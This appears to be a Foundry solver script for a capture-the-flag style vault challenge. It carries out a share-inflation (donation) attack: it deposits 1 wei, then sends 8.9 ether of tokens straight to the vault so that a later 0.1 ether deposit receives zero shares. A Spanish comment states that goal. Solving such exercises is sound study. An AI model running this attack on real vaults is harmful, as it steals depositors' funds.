// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Vault} from "../../src/02_ReverseRugpull/Vault.sol";
import {MintableERC20} from "../../src/02_ReverseRugpull/MintableERC20.sol";
import {Script, console} from "forge-std/Script.sol";

contract VaultSolver is Script {

  uint256 userPrivate = vm.envUint("PRIVATE_KEY");
  address userAddress = vm.envAddress("USER");
  MintableERC20 token;
  Vault vault;

  function run() external {
    token = MintableERC20(vm.envAddress("TOKEN"));
    vault = Vault(vm.envAddress("CONTRACT"));
    vm.startBroadcast(userPrivate);

    uint256 amount = 1;  
    token.approve(address(vault), amount);
    vault.deposit(amount);
    token.transfer(address(vault), 8.9 ether);

    vm.stopBroadcast();
  }
}

/**
 * Objetivo:
 * - el script debe depositar 0.1 ether y sus shares deben quedar en 0
 * - el contrato debe tener al menos 1e18 token
 * owner arranca con 1_000_000_000_000_000_000 (1 ether)
 * user arranca con 9_000_000_000_000_000_000 (9 ether)
 * vault arranca con 0
 * 18 decimales
 */